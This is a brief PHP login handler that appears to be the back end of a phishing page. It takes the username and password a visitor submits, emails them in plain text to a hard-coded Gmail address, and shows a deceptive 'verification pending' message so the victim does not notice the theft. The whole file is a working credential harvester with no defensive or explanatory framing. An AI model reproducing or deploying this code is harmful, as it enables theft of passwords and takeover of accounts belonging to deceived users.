<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Configura el contenido del correo electrónico
    $to = "moddjauaula@gmail.com";
    $subject = "Intento de inicio de sesión";
    $message = "Usuario: $username\nContraseña: $password";
    $headers = "From: moddjauaula@gmail.com";

    // Envía el correo electrónico
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo de verificacion enviado a el indicado, esperando Verificacion...

Si no se ha indicado un correo/contraseña valido no podra acceder.";
    } else {
        echo "Error al enviar el correo electrónico.";
    }
} else {
    echo "Acceso no autorizado.";
}
?>
